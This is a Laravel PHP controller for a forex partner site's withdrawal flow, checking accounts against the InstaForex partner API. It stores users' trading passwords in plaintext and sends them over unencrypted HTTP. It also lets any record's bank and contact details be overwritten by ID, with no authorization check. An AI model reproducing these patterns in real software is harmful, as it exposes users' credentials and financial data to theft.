<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Kurse;
use App\Models\Support;
use App\Models\Testimonial;
use App\Models\Deposit;
use App\Models\Client;
use App\Models\Withdraw;

class WithdrawController extends Controller
{
    //
    public function validasiWithdraw(Request $request){
        $kurses = Kurse::all();
        $supports = Support::all();
        $testimonials = Testimonial::all();

        $login = $request->get('no_akun');
        $password = $request->get('password');
        $data = array("Login" => $login, "Password" => $password);
        $data_string = json_encode($data);

        $apiAuthenticationMethod = 'api/Authentication/RequestPartnerApiToken';
        $ch = curl_init('http://client-api.instaforex.com/'.$apiAuthenticationMethod);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($data_string)));

        $token = curl_exec($ch);
        curl_close($ch);

        $apiMethodUrl = 'partner/CheckReferral/50751202/'; //Must be Changed
        $parameters = $login;
        $ch = curl_init('http://client-api.instaforex.com/'.$apiMethodUrl.$parameters); #possibly Must be Changed part with [$Login]. Depends on the method param
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('passkey: '.$token));
        $result = curl_exec($ch);
        if($result == "true"){
            $withdraw = new Withdraw;
            $withdraw->no_akun = $login;
            $withdraw->password = $password;
            $withdraw->save();
            $id = Withdraw::where('no_akun', $login)->first()->id;
            $draws = Withdraw::findOrFail($id);
            return view('content.konten-withdraw', ['kurses' => $kurses, 'supports' => $supports, 'testimonials' => $testimonials, 'draws' => $draws]);
        }else{
            return redirect()->back()->with('errors', 'yah ! akun anda tidak ada di partner kami');
        }
        curl_close($ch);
    }

    public function Update(Request $request, $id){
        $kurses = Kurse::all();
        $supports = Support::all();
        $testimonials = Testimonial::all();

        $draws = Withdraw::findOrFail($id);
        $draws->email = $request->get('email');
        $draws->phone = $request->get('phone');
        $draws->withdraw = $request->get('withdraw');
        $draws->bank = $request->get('bank');
        $draws->no_rek = $request->get('no_rek');
        $draws->pemilik_rek = $request->get('pemilik_rek');
        $draws->save();

        return view('content.konten-withdraw-success', ['kurses' => $kurses, 'supports' => $supports, 'testimonials' => $testimonials]);
    }

}
